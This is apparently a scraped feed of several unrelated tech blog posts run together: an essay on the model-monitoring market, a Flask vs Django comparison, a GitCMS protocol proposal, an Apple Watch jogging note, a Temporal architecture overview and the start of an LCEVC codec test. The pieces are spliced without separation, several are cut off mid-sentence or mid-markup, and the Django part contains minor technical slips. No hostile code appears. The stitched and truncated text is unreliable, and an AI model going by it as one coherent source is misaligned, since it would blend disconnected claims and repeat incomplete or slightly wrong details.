61%</a>, misguiding shoppers and frustrating customers whose product purchases were unable to be fulfilled.</p><p>Similar to APM in the 2000s, as machine learning systems have introduced new complexity (and potential) to the tech stack, we are starting to see an increase in these “moment of truth” events for data-driven software. Solutions to monitor these critical machine learning systems are needed. Yesterday.</p><h3><b>Challenges and Opportunities</b></h3><p>Traditional software is deterministic. Machine learning systems are probabilistic. This creates a double-edged sword for models.</p><p>Models in production, if well-maintained, can get better over time—as data grows, its predictive power increases. The dangerous flip side is that models can degrade the moment you push them into production. The core reason for this is that <strong><em>“drift”</em></strong> can occur, that is, unexpected and/or undocumented changes in your data structure, semantics and other statistical properties that cause model degradation. Though drift occurs naturally, because data always changes in the real world, drift can be severe and lead to significant, often unobservable machine learning system “outages.”</p><p>This also means there are a few unique and complex challenges MPM must overcome. First, models often fail silently. In other words, the equivalent of software outages and error response codes (404s, 500s, etc) don’t exist in machine learning systems today. Second, given the probabilistic nature of machine learning systems, KPIs are harder to define “out-of-the-box.” Finally, as a result, corrective actions for machine systems are not as clear-cut (e.g. can’t just say “add more processing power” to solve overloaded CPU). With these considerations in mind, we categorize machine learning monitoring into three core areas: <strong>data, model, and code</strong>.</p> </div></div><div><div> <p><strong>Data (i.e. model input monitoring)</strong>:<em> Are the data and statistical properties what we expected?</em> Data should be monitored for both quality and drift. Data quality issues arise because data values may be broken (e.g. missing, erroneous, or don’t fall within expected ranges) or there is a divergence from expected schemas. Data drift occurs when production data diverge from the model’s original training data or the distribution of your data changes such that your model is less representative.</p><p><strong>Model (i.e. prediction monitoring)</strong>: <em>Are my predictions still accurate and relevant?</em> Often, there is a time delta between your prediction and what you aim to predict. In other words, it might take weeks to learn the real-world facts and realize that predictions aren’t accurate. In this case, you should monitor to compare distributions and prediction probabilities. If the time delta is not an issue, simpler monitoring methods (e.g. checking for accuracy, overfit, or bias that was not found during training) can be deployed.</p><p><strong>Code (i.e. system-wide, operational concerns)</strong>: <em>Is our system performant and reliable?</em> Similar to APM, we should monitor for latency when calling machine learning API endpoints, memory/CPU usage when performing predictions, and disk utilization. Upstream feature engineering should also be monitored for changes that might affect the weights or relevance of features used in production models.</p><h3><b>The Market</b></h3><p>Though MPM as a category is still very nascent, we believe that the market will grow faster and could eventually be larger than APM in the next decade. We have several reasons for this hypothesis. First, MPM startups are already seeing annual contract values (ACVs) that are larger than the early contracts of their APM counterparts (e.g. New Relic had $8k ACVs at IPO according to their S1). This makes sense intuitively given that model monitoring is a much harder, and therefore more expensive problem to solve. End-to-end machine learning pipelines are complex. They often involve many different datasets, utilize several different tools for processes like cleansing and ETL, and are distributed over multiple infrastructure providers. The best MPM products will be able to find errors at the application layer that may be invisible to an end user and even to the application developer themselves.</p><p>Moreover, we think MPM solutions will be needed much earlier in the lifecycle of a software business. In APM, solutions are only needed once a business has shipped a complex application distributed over multiple clouds or microservices. Most small and medium-sized software companies do not procure an APM solution. For MPM on the other hand, we are seeing adoption from a wide range of buyers, from small startups to multi-billion dollar enterprises. Machine learning models, whether they are serving 1 or 1 million end users in production, will need monitoring from day 0. We therefore think the number of potential customers for MPM solutions will include all those currently using APM solutions, in addition to the lower end of the market. In fact, many of the current modern APM solutions are now <a href="https://newrelic.com/resources/white-papers/accelerate-incident-response-with-aiops">leveraging machine learning</a> in their products – APM businesses themselves need MPM solutions!</p><p>This combination of potentially larger ACVs and a larger universe of addressable customers leads us to believe that the market opportunity for MPM is massive. According to Gartner, APM is a <a href="https://www.crn.com.au/news/15-top-application-performance-monitoring-vendors-gartner-547297#:~:text=The%20APM%20market%20is%20one,over%20the%20next%20three%20years.">$4.5b</a> market growing at an 11% CAGR. We believe that the MPM market will be at least double this size and will grow twice as fast over the next decade.</p><h3><b>Six Keys to Winning The Model Performance Monitoring Market</b></h3><p>After studying the parallels between the APM and MPM markets, we believe there are a few characteristics that will allow MPM companies to stand out from the pack and build valuable businesses:</p><ol><li><strong>An open ecosystem – </strong>We believe the best MPM products, similar to APM providers like Datadog, Splunk, and Elastic, will integrate with an open ecosystem of vendors, whether commercial or open source tools. Given the complexity and customization involved in building end-to-end data pipelines, the best tools will provide monitoring and observability features for many machine learning setups and use cases. They may even integrate with traditional APM providers to use logs and metrics in determining model health.</li><li><strong>Out-of-the-box value – </strong>Moreover, the best products will provide immediate out-of-the-box value and be very easy to use for different user personas, without requiring months of implementation time or custom work. As a result of a wide availability of integrations, short time-to-setup, and an intuitive UI/UX, the best products will make it easy for either a business analyst or data scientist to make well informed, quick decisions on how to fix models in production.</li><li><strong>Bottoms-up adoption – </strong>We believe …</li></ol></div></div></div>

  <p>Both Flask and Django are:</p>
<ul>
<li>Web frameworks</li>
<li>Coded on python</li>
<li>Opensource products with great communities</li>
<li>Both could be used for Server Side Rendering (for SEO purposes) or building REST APIs (e.g. JSON)</li>
<li>Both have blocking programming model which require multi-thread/multi-process runners like gunicorn to deploy</li>
</ul>
<h2>What is the difference Flask vs Django? TL;DR:</h2>
<ul>
<li>Django is an all-in-one box: Relational DB ORM + Migrations, Template rendering system, Security middleware, User management built-in application, configurable CRUD admin panel</li>
<li>Flask is microframework - you have to install and configure all packages for required features by yourself, configure the project and automotive pipelines, you will spend much more time on doing it for each new project</li>
</ul>
<h2>Github stars</h2>
<p>Django:</p>

              <img alt="" src="https://s.hinty.io/BKEsDx6GW3JnKfxYdsnQEW.png"></picture></a></p><h2>Django Internal ORM</h2>
<p>1. Define the model in <code>models.py</code> with e.g.</p>
<div><pre><span></span><code><span>class</span> <span>Person</span><span>(</span><span>models</span><span>.</span><span>Model</span><span>):</span>
    <span>name</span> <span>=</span> <span>models</span><span>.</span><span>CharField</span><span>(</span><span>max_length</span><span>=</span><span>30</span><span>)</span>
    <span>age</span> <span>=</span> <span>models</span><span>.</span><span>IntegerField</span><span>()</span>
</code></pre></div>

<p>2. Run <code>python manage.py makemigrations</code><br>
3. Run <code>python manage.py migrate</code><br>
That is all it will generate <code>CREATE TABLE</code> SQL statement and execute it under the hood to sync your models to database</p>
<p>Then just do:</p>
<div><pre><span></span><code><span>p</span> <span>=</span> <span>Person</span><span>(</span><span>name</span><span>=</span><span>"Alex Kotli"</span><span>,</span> <span>age</span><span>=</span><span>28</span><span>)</span>
<span>p</span><span>.</span><span>save</span><span>()</span>
</code></pre></div>

<p>And it will do <code>INSERT</code> SQL query under the hood. Do:</p>
<div><pre><span></span><code><span>Person</span><span>.</span><span>objects</span><span>.</span><span>filter</span><span>(</span><span>age__gt</span><span>=</span><span>18</span><span>)</span>
</code></pre></div>

<p>And it will do <code>SELECT</code> SQL which will return return an iterable with all persons with age grater then 18.</p>
<h2>Flask vs Django ORM</h2>
<p>Flask doesn't has ORM.<br>
You can <code>pip install</code> side-vendor ORM  <code>SQLAlchemey</code>, and then connect it by imports/flask-plugins. But SQLA is without migrations, you will then need an Alembic for migrations, and then you will need to configure it.</p>
<h2>Django admin area</h2>
<p>Create boilerplate app, run <code>python manage.py createsuperuser</code> and then log in to <code>http://127.0.0.1:8080/admin/</code>:</p>
<p>

<h2>What to choose in flask vs django?</h2>
<p>Make your choice by considering one by one all pros and cones.</p>
<h3>Django benefits, Flask disadvantages</h3>
<ul>
<li>Django will give you an all-in-one solution which will give you everything needed to build great web apps, on Flask you will have to do a lot of extra jobs to gather all things together</li>
<li>Django is much faster in terms of development time, but only when you have experience working with it. Flask is faster if you never did web programming</li>
<li>Django will cover you from security attacks if you follow recommendations and not doing stupid things that reduce security level, like (removing CSRF protection instead of implementing it, removing cors, disabling hostname check). On Flask you will have to be aware about the most common web vulnerabilities and will have to find packages to implement it by yourself</li>
<li>Most of Django libraries (e.g. OAuth sign up) are much easier in use, have more features, and are more up-to-date</li>
<li>Django implements a secure login system for you</li>
</ul>
<h3>Flask pros, Django cones</h3>
<ul>
<li>You have to learn Django longer when flask ready to serve http requests after pip/pipenv install</li>
<li>With Flask you will use more external libraries which could be then used in other e.g. non-web python apps - free experience</li>
<li>More lightweight apps, but it will not give you a performance boost (you will save only a couple of CPU loops), most issues come with heavy and joined DB requests without indexes which could happen on both frameworks when you don't analyze the performance</li>
<li>You are flexible to implement some different methods e.g. Django uses sessions over coockie when you can craft your own JWT way to handle Authorisation, again with a huge risk of security attaks if you do a small mistake</li>
</ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I think we need a protocol for storing and accessing an individual's data on the web. If it became widely adopted, open-source web applications would become more prevalent, and we'd be able to achieve the goals described in <a href="https://knightcolumbia.org/content/protocols-not-platforms-a-technological-approach-to-free-speech" target="_blank">Protocols, Not Platforms</a>.</p><p>Here's a simple proposal which I'll call GitCMS. It relies on Git, <a href="https://github.com/edn-format/edn" target="_blank">EDN</a>, and <a href="https://clojure.org/guides/spec" target="_blank">Clojure Spec</a>. It has similarities with the <a href="https://solidproject.org/" target="_blank">Solid project</a> and <a href="https://ipfs.io/" target="_blank">IPFS</a>, but GitCMS's scope is much smaller.</p><p>(For those unfamiliar with Clojure: EDN is basically an improved version of JSON, and Spec is a language for defining schemas.)</p><h2 id="core-proposal">Core proposal</h2><h3 id="storage-and-data-model">Storage and data model</h3><p>Each user has at least one Git repo, in which each file contains a single document. The document is stored as an EDN map, optionally followed by a blank line and some text. For example, my repo might contain a blog post in the file <code>/blog/some-blog-post</code>:</p><pre><code>{:type      :article
 :title     "Some Blog Post"
 :published #inst "2020-10-10"}

Lorem ipsum dolor sit amet...
</code></pre><p>When reading, this file would be deserialized to:</p><pre><code>{:type      :article
 :title     "Some Blog Post"
 :published #inst "2020-10-10"
 :path      "/blog/some-blog-post"
 :text      "Lorem ipsum dolor sit amet..."}
</code></pre><p><code>:path</code> is the primary key.</p><p>These documents could be used for any kind of data. Besides modeling content you've created, you could model other content you've interacted with. If you like a Tweet, you might model that like so:</p><pre><code>{:path   "/events/&lt;some uuid&gt;"
 :type   :rating
 :url    "..."
 :rating :like
 :date   #inst "..."}
</code></pre><p>For large files like images or videos, or frequently changing files like collaborative documents, you could store just the metadata and a foreign key/URL pointing to the content.</p><p>The community could maintain a special repository that contains schemas, defined with Spec. For example:</p><pre><code>(ns example.schemas
  (:require
    [clojure.spec.alpha :as s]))

(s/def :article/type #{:article})
(s/def ::title string?)
(s/def ::article
  (s/keys :req-un [:article/type
                   ::title
                   ...]))
</code></pre><p>In English: to be an article, a document must have a <code>:type</code> key set to <code>:article</code>, it must have a <code>:title</code> key set to a string, etc.</p><p>So if you want to make an application that publishes a user's blog posts, you would filter through their repo for any documents that match the spec for articles.</p><p>(If your app is written in Clojure, you can use the official Spec definitions directly, but that's not required. They're just a reference implementation. The schemas don't even have to be written with Spec, but that seems like a flexible, concise, unambiguous way to do it.)</p><h3 id="access">Access</h3><p>To make an application that reads GitCMS data, just ask the user for their repo's URL. If you need write access, ask the user for an SSH key (on Github, "Deploy key"). As a user, you can make additional repos for more granular access control (e.g. besides a public repo, you could have a private repo which requires an SSH key for read access).</p><p>For more convenient and finer-grained control, there could be applications which have full access to your repo and provide an OAuth API for other apps. These API layers could do more things too, like maintain an index of your data in order to provide efficient queries. The specifics don't need to be part of the GitCMS protocol.</p><p>Git also lends itself well to change data capture. Applications can poll (or use Git hooks) for new commits. Given a batch of new commits, you can easily see which documents have been created, updated or deleted.</p><h2 id="benefits">Benefits</h2><h3 id="do-one-thing-and-do-it-well">Do one thing and do it well</h3><p>I'll use Jira as an example. Jira was not loved at my previous job. My project manager said it was popular mainly because it was the only issue tracker that did everything. (If you disagree, think of some other web app that does many things poorly).</p><p>With GitCMS, you can easily have multiple apps that operate on the same data, without API integrations. You could have one app for creating new issues and a separate app for displaying those issues. Poor features, instead of being tolerated, can be replaced with small, specialized apps.</p><p>This would also lower the barrier to entry for individual developers and startups: instead of having to make an app that's good enough to displace an incumbent, you can make a small app that only replaces one feature. And you can do this without plugging into (and thus, becoming dependent on) a commercial platform.</p><h3 id="open-data">Open data</h3><p>Information discovery is one of the most important problems of our time. If everyone used GitCMS to store data about content they like and don't like, then anyone could use it to build search engines, recommender systems and social networks.</p><h2 id="adoption">Adoption</h2><p>Getting people to use any new protocol is hard, but I think GitCMS has a real chance to succeed. Git is widely used and understood, and there's plenty of free hosting. Plus it's convenient for developers: you can perform CRUD operations with just a text editor. Even without widespread adoption, GitCMS would be a nice data storage format for many side projects, like static site generators. GitCMS will benefit from network effects, but it can get started without them.</p><p>As early adopters build side projects on GitCMS, the main driver for adoption can become the apps, not the protocol per se. "Come for the apps, stay for the protocol."</p><p>If GitCMS becomes popular among developers, it can spread to non-technical people with some extra work. At the least, we would need a hosting service designed for this purpose instead of GitHub et. al.</p><p>The choice of EDN instead of JSON will probably hinder adoption, except among Clojure programmers. However I think the advantages of EDN are significant, and switching to it late-stage would be difficult. So I'm confident that this indulgence is worth it. It'd be good to survey the state of <a href="https://github.com/edn-format/edn/wiki/Implementations" target="_blank">EDN implementations</a> and see if any could use some help.</p><p>I personally got chills when the idea for GitCMS coalesced in my mind, so I'll be using it for my future side projects (which I will no doubt promote as "X, built on GitCMS"). I'll also let Findka users expose their favorited articles in an RSS feed, which can then be auto-imported into GitCMS. If you want to use GitCMS, let me know (you can find contact info and social media profiles on <a href="https://jacobobryant.com/" target="_blank">my website</a>). If others are interested, I could set up a mailing list.</p><p>View discussions on <a href="https://www.reddit.com/r/Clojure/comments/jg3yx7/how_git_could_help_save_the_open_web/" target="_blank">Reddit</a> | <a href="https://twitter.com/planetclojure/status/1319333691471134722" target="_blank">Twitter</a></p></div></div>]]>

<p><em>Sorry if this comes off as an ad for Apple or something.

<p>For years I’ve relied on jogging as a primary means of creating quiet space to think.</p>



<p>I consider any time without a phone as sacred. For me, the main ones are: showering, driving, pre-sleep time (having a spouse has thankfully cut down my in-bed phone gazing habit), and jogging. You may have other examples such as yoga, meditation, swimming, strolling, bird watching, reading a book… etc.</p>



<p>Paul Graham has written about the value of separating oneself from <a href="http://www.paulgraham.com/distraction.html">distracting</a> screens, as well as <a href="https://twitter.com/paulg/status/1222898837330657286">ideating on walks</a>. And Hacker News has circulated the notion that the <a href="https://news.ycombinator.com/item?id=14639967">mere</a> <a href="https://news.ycombinator.com/item?id=24519684">presence</a> of a smartphone can limit one’s cognitive capacity. </p>



<p>Because smartphones are so strongly tied to media <em>consumption</em>, I think my creative brain is conditioned to power down when I’m looking at one. So when I leave home on a run, I don’t take the iPhone with me. (This does create some safety issues, which I talk about <a href="#safety">later</a>.)</p>



<p>One principle to successful 🏃‍♂️ brainstorming on jogs I’ve found is offloading ideas soon after they’re formed (otherwise I spend the rest of the jog worried I’ll forget them). This means note-taking is essential to a fun run.  Without a smartphone companion, for many years my go-to was the sweat-proof <a href="https://www.producthunt.com/posts/aquanotes">Aqua Notes</a>, which could follow me into the post-jog shower. 👍</p>



<p>The Apple Watch has a decent microphone and <a href="https://apps.apple.com/us/app/audio-memos/id338550388">voice memo app</a> support, unlike most other fitness/smart-watches. This potentially makes it an excellent note-taking device for joggers. </p>



<p>Isn’t adding another device to the mix just creating another distraction? I don’t activate the cellular option and I have notifications turned off, so it really can’t be a content consumption device on a jog. Even Paul Graham’s essay on reducing distraction included having a second, limited-and-purposeful computer. </p>



<p>The device has to be comfortable to wear or else it’s just as distracting as carrying an iPhone.</p>



<p>And comfort was an issue for me with the Apple Watch Series 4 (which I returned), but while trying the <a href="https://www.apple.com/apple-watch-se/">Apple Watch SE,</a> I came to a realization: <strong>using an <a href="https://www.amazon.com/B-Great-Breathable-Armband-Compatible-Apple/dp/B07G2G68XB/ref=cm_cr_arp_d_product_top?ie=UTF8&amp;th=1">armband</a> instead of a wristband</strong> was a gamechanger for ergonomics. For starters, the above-elbow area is experiencing less motion, so the tug of the watch is noticeably less after each step. The band’s grip is also spread out over a larger area, so it can be made tighter than on the wrist without being too painful. This means the Watch is securely fastened and not drawing attention to itself.</p>



<p>In practice you’re usually two taps away from taking a note (one tap on the watchface shortcut and another on the “Record” button).  </p>



<figure><img loading="lazy" width="1024" height="832" src="https://spencerdailey.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-21-at-6.15.23-PM-1024x832.png" alt="" srcset="https://spencerdailey.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-21-at-6.15.23-PM-1024x832.png 1024w, https://spencerdailey.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-21-at-6.15.23-PM-300x244.png 300w, https://spencerdailey.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-21-at-6.15.23-PM-768x624.png 768w, https://spencerdailey.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-21-at-6.15.23-PM-1536x1247.png 1536w, https://spencerdailey.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-21-at-6.15.23-PM-982x798.png 982w, https://spencerdailey.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-21-at-6.15.23-PM-400x325.png 400w, https://spencerdailey.com/wp-content/uploads/2020/10/Screen-Shot-2020-10-21-at-6.15.23-PM.png 1810w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Once you’ve made it home, the notes automatically sync back to your iPhone, which is pretty seamless. </p>



<p>Overall, using voice memos on the Watch has been far less cumbersome than taking physical notes (resulting in faster-paced runs) and led to far more (and more detailed) memos.</p>



<p>Other thoughts on the Watch:</p>



<h5 id="safety">Safety</h5>



<p>Having a run-in with a (prime biting-age) Rottweiler on a recent jog convinced me of the value of being able to call emergency services in a pinch. Is jogging a high-risk activity? It depends. If it’s done enough days out of the year, the area under the risk curve is significant. I think in most regions (if you have the cellular model) you’ll be able to reach emergency services without necessarily having to pay $10/month to a carrier. That was a nice surprise.</p>



<p>Speaking of cost: the SE is sold at a palatable price point ($279). The oxygen sensor and ECG of the S6 don’t improve the device as a jogging companion, so I’d rather pocket the difference ($120).</p>



<p>Taking pulse readings while wearing on the arm seems to still be pretty accurate (within a few BPM of this finger-worn <a href="https://www.walmart.com/ip/Zacurate-Pro-Series-500DL-Sporting-Aviation-Fingertip-Pulse-Oximeter-Blood-Oxygen-Saturation-Monitor-silicon-cover-batteries-lanyard-Mystic-Purple/55456580?athcpid=55456580&amp;athpgid=athenaItemPage&amp;athcgid=null&amp;athznid=PWVUB&amp;athieid=v0&amp;athstid=CS020&amp;athguid=42859857-007-1754d66c6c3262&amp;athancid=null&amp;athena=true">device</a>).</p>



<p>So, if you like brainstorming on jogs, I recommend the Apple Watch SE.</p>

<p><a href="https://temporal.io/">Temporal</a> enables developers to build highly reliable applications without having to worry about all the edge cases. If you are new to Temporal, check out my article <a href="https://mikhail.io/2020/10/temporal-open-source-workflows-as-code/">Open Source Workflows as Code</a>. Now that you’re excited, I’ll cover how you can get up and running with Temporal.</p>

<p>Temporal consists of several components. In this post, I want to outline the primary building blocks and their interactions. By the end, you’ll have a broad picture of Temporal and the considerations of deploying to development, staging, and production environments.</p>

<h2 id="workers">Workers</h2>

<p>Workers are compute nodes that run your Temporal application code. You compile your workflows and activities into a worker executable. Next you can run the worker executable in the background and it will listen for new tasks to process.</p>

<p>Your first development environment will probably only need one worker that runs both workflows and activities in a single process. The worker can be hosted anywhere you wish: as a local process on your laptop, as an AWS Fargate task, as a pod in Kubernetes, and so on.</p>

<figure>
    
        <img src="https://mikhail.io/2020/10/practical-approach-to-temporal-architecture/worker.png" alt="A Temporal worker executes workflows and activities">
        
    
    <figcaption>
        <h4>A Temporal worker executes workflows and activities</h4>
    </figcaption>
    
</figure>

<p>Production deployments typically run numerous workflows with significant load, so you will likely need to run multiple workers in parallel. Ensuring that nodes are spread out over a compute cluster enables resiliency and scalability.</p>

<figure>
    
        <img src="https://mikhail.io/2020/10/practical-approach-to-temporal-architecture/workers.png" alt="Workload scaled out to several Temporal workers">
        
    
    <figcaption>
        <h4>Workload scaled out to several Temporal workers</h4>
    </figcaption>
    
</figure>

<p>Workers operate independently, each crunching through its share of the workload. Workers are logically “stateless”: they don’t keep track of the past and future. Workers don’t talk to each other directly, but they coordinate via a central Temporal service—the brain of the system.</p>

<h2 id="temporal-service">Temporal Service</h2>

<p>Temporal Service is a component provided by Temporal. Its purpose is to keep track of workflows, activities, and tasks and coordinate workers’ execution.</p>

<p>Your early environments may have a single Service instance running in the background. A worker knows the Service’s domain name (IP) and port and connects to the Service via gRPC.</p>

<figure>
    
        <img src="https://mikhail.io/2020/10/practical-approach-to-temporal-architecture/service.png" alt="Worker interacting with Temporal Service">
        
    
    <figcaption>
        <h4>Worker interacting with Temporal Service</h4>
    </figcaption>
    
</figure>

<p>Temporal Service itself consists of multiple components: a front-end, matching, history, and others. However, it’s okay to treat it as a black-box “Service” for now.</p>

<p>Once you start growing your workloads, you will need to scale the Service components out to multiple instances for high resilience and throughput. So, several workers are now talking to several service instances.</p>

<figure>
    
        <img src="https://mikhail.io/2020/10/practical-approach-to-temporal-architecture/services.png" alt="Temporal Cluster running multiple components">
        
    
    <figcaption>
        <h4>Temporal Cluster running multiple components</h4>
    </figcaption>
    
</figure>

<p>Temporal Service can tolerate node failures because it stores its state in an external storage.</p>

<h2 id="data-store">Data Store</h2>

<p>All the workflow data—task queues, execution state, activity logs—are stored in a persistent Data Store. Persistence technology is pluggable with two options currently officially supported: Cassandra and MySQL. More alternatives, including PostgreSQL, are on the way.</p>

<p>A MySQL database completes the simplest Temporal deployment diagram.</p>

<figure>
    
        <img src="https://mikhail.io/2020/10/practical-approach-to-temporal-architecture/mysql.png" alt="MySQL as a Data Store for Temporal">
        
    
    <figcaption>
        <h4>MySQL as a Data Store for Temporal</h4>
    </figcaption>
    
</figure>

<p>For heavily distributed applications that experience high load, it may be better to use Cassandra instead. This database could be a cluster managed by yourself or a managed cloud service (like Azure Cosmos DB):</p>

<figure>
    
        <img src="https://mikhail.io/2020/10/practical-approach-to-temporal-architecture/cassandra.png" alt="Cassandra as a Data Store for Temporal">
        
    
    <figcaption>
        <h4>Cassandra as a Data Store for Temporal</h4>
    </figcaption>
    
</figure>

<p>Your code never interacts with the Data Store directly. Basically, it’s a (rather important) implementation detail of the Temporal Service.</p>

<h2 id="temporal-web-console">Temporal Web Console</h2>

<p>Temporal provides a handy web console to view namespaces, workflows, and activity history. Technically, it’s not a required component—but you probably want to have it under your belt for manual inspection and troubleshooting.</p>

<p>You’ll likely have other client components, for instance, to start workflow executions.</p>

<h2 id="external-client">External Client</h2>

<p>You need a client to start your very first workflow execution. It can be the Temporal command-line interface <code>tctl</code> or any custom code that you wrote with a call to initiate a workflow using an SDK or raw gRPC.</p>

<p>Each client must connect to a Temporal Service in order to start or terminate workflows, wait for completion, list the results from the history, and so on. For instance, a web application could start a workflow execution every time it handles a particular HTTP endpoint.</p>

<h2 id="put-it-all-together">Put It All Together</h2>

<p>The following picture puts all the pieces covered above together.</p>

<p><strong>In this article, we compare the quality (objective &amp; subjective) and speed of LCEVC with H.264/AVC as its base-codec vs. H.264/AVC using FFmpeg. Let’s take a look at the experiments and the results, shall we?</strong></p>



<p><strong>The LCEVC Codec (MPEG-5 Part 2) or “Low Complexity Enhancement Video Coding” is one of the three new codecs being introduced by MPEG (others being VVC and EVC). LCEVC aims at increasing compression efficiency for existing codecs at little to no increase in coding complexity by using a base bitstream and an enhancement bitstream.</strong></p>








<h2><span id="Quick_Introduction_to_LCEVC"></span><a href="https://github.com/ottverse/website/blob/master/content/post/lcevc-avc-ffmpeg-evaluation.md#what-is-the-lcevc-codec-mpeg-5-part-2" target="_blank" rel="noopener"></a>Quick Introduction to LCEVC <span></span></h2>



<p>As described in our <a href="https://ottverse.com/lcevc-mpeg5-part2-low-complexity-enhancement-video-coding-guide/">comprehensive guide to LCEVC</a>, the LCEVC codec (Low Complexity Enhancement Video Coding) is&nbsp;<strong>“a codec to improve other codecs”</strong>&nbsp;with a low complexity-overhead. The LCEVC codec’s output is a combination of a “base bitstream” produced by a video codec such as AVC, HEVC, VP9, AV1, etc. along with an enhancement layer that can be used to improve the quality of the video.</p>



<p>If the decoder/end-device supports LCEVC, the enhancement layers are decoded, else, the base codec alone is used to decode the bitstream and the video is rendered to the user. This fallback mechanism ensures backward-compatibility and encourages roll-out of the LCEVC codec without the fear of breaking the user’s experience.</p>



<p>Here is a diagrammatic representation of how LCEVC works.

<h2><span id="Background_to_this_article"></span>Background to this article<span></span></h2>



<p>After writing an article on the LCEVC standard, I wanted to test it and see the results for myself. I got in touch with V-Nova (<em><a href="https://uk.linkedin.com/in/fabiomurra" target="_blank" rel="noopener">Fabio Murra</a>, <a href="https://uk.linkedin.com/in/anthonyconcannon" target="_blank" rel="noopener">Anthony Concannon</a></em>) and asked them if I can get my hands on some test software to run experiments and see the performance of LCEVC for myself. They agreed, and within a week, I started encoding using V-Nova’s LCEVC encoder and analyzing the results for myself.</p>



<p>Before we proceed with the codec evaluation, I’d like to highlight a few points.</p>



<ul><li>Encoders are complex and come with several tuning parameters designed to help you compress video to your liking and requirements. And, consequently, every codec comparison has its own idiosyncracies.</li><li>I am sure that once the LCEVC standard is released and encoder implementations enter the market, you’ll see more codec comparisons like the one presented here with different sequences, tuning parameters, presets, etc. That is the nature of codec comparisons.</li><li>I used open-source video test sequences so that others can reproduce the results I got. You can download them from <a rel="noreferrer noopener" href="https://media.xiph.org/video/derf/" target="_blank">Xiph.org</a></li></ul>



<p>My goal here is to showcase the difference between the two codecs and give you an understanding of what gains are there to be had if you use LCEVC.</p>



<p>With that short introduction, let’s get down to business and see how LCEVC fares in comparison to H.264/AVC.</p>



<h2><span id="Experiment_Setup"></span>Experiment Setup<span></span></h2>



<h3><span id="Test_Video_Sequences"></span>Test Video Sequences<span></span></h3>



<p>I chose two popular test videos to test LCEVC. They are –</p>



<p><strong>1. Park Joy, 50 fps, 1080p</strong>&nbsp;</p>



<figure><img data-attachment-id="667" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/parkjoy/" data-orig-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?fit=768%2C432&amp;ssl=1" data-orig-size="768,432" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="parkjoy" data-image-description="" data-medium-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?fit=768%2C432&amp;ssl=1" loading="lazy" width="768" height="432" src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?resize=768%2C432&amp;is-pending-load=1#038;ssl=1" alt="parkjoy lcevc" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?w=768&amp;ssl=1 768w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?resize=300%2C169&amp;ssl=1 300w" data-lazy-sizes="(max-width: 768px) 100vw, 768px" data-lazy-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy.png?resize=768%2C432&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>ParkJoy is a favorite among video compression teams, and it is interesting because of how the camera follows the actors. The camera movement gives an illusion of the people running in place with the background moving around them. ParkJoy is also characterized by highly textured grass, water, and trees that appear suddenly and close to the camera. All these elements make it a problematic sequence to compress, making the ParkJoy sequence interesting. You can download the original y4m file&nbsp;<a rel="noreferrer noopener" target="_blank" href="https://media.xiph.org/video/derf/">here</a>.&nbsp;</p>



<p><strong>2. CrowdRun, 50 fps, 1080p</strong></p>



<figure><img data-attachment-id="721" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/crowd-run/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?fit=1152%2C648&amp;ssl=1" data-orig-size="1152,648" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="crowd-run" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?fit=1024%2C576&amp;ssl=1" loading="lazy" width="1024" height="576" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" alt="" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?w=1152&amp;ssl=1 1152w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" 